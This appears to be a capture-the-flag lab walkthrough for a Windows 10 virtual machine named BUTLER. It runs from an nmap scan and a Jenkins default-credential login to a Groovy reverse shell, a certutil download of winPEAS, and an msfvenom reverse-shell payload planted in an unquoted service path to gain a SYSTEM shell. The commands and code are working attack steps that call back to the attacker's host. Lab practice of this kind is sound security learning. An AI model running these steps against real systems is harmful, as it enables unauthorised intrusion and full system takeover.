
IP - 10.247.195.112

## Scanning 

Nmap scan report 

```
$ nmap -A -T4 -p- 10.247.195.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 18:35 IST
Nmap scan report for 10.247.195.112
Host is up (0.017s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-server-header: Jetty(9.4.41.v20210516)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:84:5A:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 21H2
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-17T13:12:38
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:84:5a:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT      ADDRESS
1   17.19 ms 10.247.195.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 459.68 seconds

```

**findings** : 

- A http server on 8080 -> jenkins login page 
- smb port 

## Enumeration 

- used smbclient to see if anything is there -> access denied 
- Trying default creds on jenkins login worked for **jenkins** : **jenkins**
- Got into jenkins dashboard 

## Exploitation 

- Go to jenkins dashboard -> script console -> paste groovy script got from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
```java
String host="10.247.195.204";
int port=9999;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- Start a listener on host at 9999
```bash
nc -lvnp 9999
```

- Got reverse shell

## Priv Escalation 

Downloaded winpeas from https://github.com/peass-ng/PEASS-ng/releases/download/20251115-0322d43c/winPEASx64.exe

Host a python server 

```bash
python3 -m http.server 80
```

Download from target shell using 

```powershell
certutil.exe -urlcache -f http://10.247.195.204/winPEASx64.exe winpeas.exe 
```

These just checks for any privilege escalation opportunities 

It looks a we got a excitable with **no quotes and space** path specified 

We can take advantage by placing a **malicious executable** on the **intermediate path** to make it execute instead of original one 

```

    WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [Allow: AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [Allow: AllAccess])
    In order to optimize system performance,Wise Care 365 will calculate your system startup time.

```

Let's create a **reverse shell** payload using **msfvenom** 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.247.195.204 LPORT=4444 -f exe -o Wise.exe     
```

We named it Wise.exe since that is where the path has a space and system will try to find `C:\Program Files(x86)\Wise\Wise.exe `


Let's download the file in path **C:\Program Files (x86)\Wise**

```
certutil.exe -urlcache -f http://192.168.18.248/Wise.exe Wise.exe
```

Start a listener on the payload port 

```
nc -lvnp 4444
```

Now all we got a do is stop the **WiseBootAssistant** and restart it since that is service that uses this path 

```powershell
sc stop WiseBootAssistant

sc start WiseBootAssistant
```

We got a **system32** shell 

done ....